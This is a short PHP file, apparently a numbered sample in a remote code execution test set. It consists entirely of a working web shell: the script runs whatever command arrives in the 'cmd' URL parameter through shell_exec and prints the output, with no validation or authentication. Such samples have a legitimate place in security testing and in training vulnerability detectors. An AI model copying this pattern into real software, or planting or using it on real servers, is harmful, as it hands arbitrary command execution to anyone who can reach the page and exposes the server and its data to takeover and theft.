<?php
// RCE test variation #49
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>